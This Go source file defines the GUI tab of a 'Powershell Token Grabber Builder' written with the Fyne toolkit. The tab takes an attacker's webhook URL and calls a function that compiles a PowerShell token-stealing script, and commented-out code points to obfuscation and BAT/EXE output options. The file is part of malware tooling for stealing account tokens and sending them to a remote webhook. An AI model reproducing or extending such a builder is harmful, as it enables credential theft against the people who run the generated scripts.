package powershellTab

import (
	"builder/modules/options/powershell"
	"image/color"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

func GetBuilderPowershell(a fyne.App) *fyne.Container {
	blue := color.NRGBA{R: 0, G: 128, B: 191, A: 255}
	//white := color.NRGBA{R: 255, G: 255, B: 255, A: 255}
	//red := color.NRGBA{R: 180, G: 0, B: 0, A: 255}

	mainTitle := canvas.NewText("Powershell Token Grabber Builder", blue)
	mainTitle.Alignment = fyne.TextAlignCenter
	mainTitle.TextSize = 18

	webhookEntry := widget.NewEntry()
	webhookEntry.SetPlaceHolder("Webhook URL")

	//basically just do nothing when the checkbox is checked
	//obfuscateCheckBox := widget.NewCheck("Obfuscate", func(_ bool) {})
	//obfuscateCheckBox.SetChecked(false)

	compileButtonPS1 := widget.NewButton("Compile PS1", func() {
		powershell.CompilePowershellFile(a, webhookEntry.Text)
	})

	entryLayout := container.New(layout.NewVBoxLayout(),
		mainTitle,
		webhookEntry,
		//obfuscateCheckBox,
		layout.NewSpacer(),
		compileButtonPS1,
		//compileButtonBAT,
		//comepileButtonEXE,
	)

	return entryLayout
}
